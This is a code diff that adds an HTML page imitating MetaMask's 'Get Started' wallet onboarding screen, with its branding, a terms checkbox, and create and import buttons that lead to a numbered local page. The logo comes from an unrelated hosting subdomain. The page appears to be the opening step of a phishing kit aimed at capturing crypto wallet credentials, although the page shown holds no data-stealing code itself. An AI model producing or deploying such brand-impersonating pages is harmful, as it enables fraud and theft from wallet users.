@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MetaMask - Get Started</title>
+  <!-- ✅ Favicon MetaMask transparent -->
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .top-bar {
+      width: 100%;
+      max-width: 700px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 30px 30px 10px;
+    }
+
+    .logo {
+      font-weight: bold;
+      font-size: 20px;
+    }
+
+    .language-select {
+      padding: 6px 12px;
+      font-size: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    main {
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 10px 20px 40px;
+      width: 100%;
+    }
+
+    .card {
+      background-color: white;
+      border-radius: 20px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      padding: 40px;
+      max-width: 420px;
+      width: 100%;
+      border: 1px solid #e0e0e0;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 26px;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: #666;
+      margin-bottom: 30px;
+    }
+
+    .fox-logo {
+      width: 140px;
+      margin: 0 auto 30px;
+      display: block;
+    }
+
+    .checkbox {
+      margin-bottom: 25px;
+      font-size: 14px;
+    }
+
+    .checkbox input {
+      margin-right: 8px;
+    }
+
+    .buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 10px;
+    }
+
+    .primary-btn, .secondary-btn {
+      padding: 14px 0;
+      font-size: 16px;
+      border-radius: 24px;
+      text-align: center;
+      cursor: pointer;
+      transition: 0.2s ease;
+      text-decoration: none;
+      display: block;
+    }
+
+    .primary-btn {
+      background: linear-gradient(90deg, #537cff, #6563ff);
+      color: white;
+    }
+
+    .secondary-btn {
+      background-color: transparent;
+      border: 1px solid #ccc;
+      color: #666;
+    }
+
+    .disabled {
+      pointer-events: none;
+      opacity: 0.5;
+    }
+
+    @media (max-width: 600px) {
+      .card {
+        padding: 25px;
+      }
+
+      h1 {
+        font-size: 22px;
+      }
+
+      .top-bar {
+        flex-direction: column;
+        gap: 10px;
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Logo et langue -->
+  <div class="top-bar">
+      
+            <div><img src="https://seagreen-hawk-999153.hostingersite.com/img/meta.png" alt="cbcLogo" width="70px"></div>
+
+    <select class="language-select">
+      <option value="en">English</option>
+      <option value="fr">Français</option>
+      <option value="es">Español</option>
+    </select>
+  </div>
+
+  <!-- Carte -->
+  <main>
+    <div class="card">
+      <h1>Let's get started</h1>
+      <p class="subtitle">Trusted by millions, MetaMask is a secure wallet making the world of web3 accessible to all.</p>
+
+      <!-- Logo image -->
+      <img src="fox.png" alt="MetaMask Fox" class="fox-logo">
+
+      <!-- Checkbox -->
+      <div class="checkbox">
+        <label>
+          <input type="checkbox" id="agreeBox" onchange="enableButtons()"> I agree to MetaMask's <a href="#">Terms of use</a>
+        </label>
+      </div>
+
+      <!-- Boutons -->
+      <div class="buttons">
+        <a href="3.html" class="primary-btn disabled" id="createBtn">Create a new wallet</a>
+        <a href="3.html" class="secondary-btn disabled" id="importBtn">Import an existing wallet</a>
+      </div>
+    </div>
+  </main>
+
+  <!-- Script activation des liens -->
+  <script>
+    function enableButtons() {
+      const checked = document.getElementById('agreeBox').checked;
+      const createBtn = document.getElementById('createBtn');
+      const importBtn = document.getElementById('importBtn');
+
+      if (checked) {
+        createBtn.classList.remove('disabled');
+        importBtn.classList.remove('disabled');
+      } else {
+        createBtn.classList.add('disabled');
+        importBtn.classList.add('disabled');
+      }
+    }
+  </script>
+
+</body>
+</html>
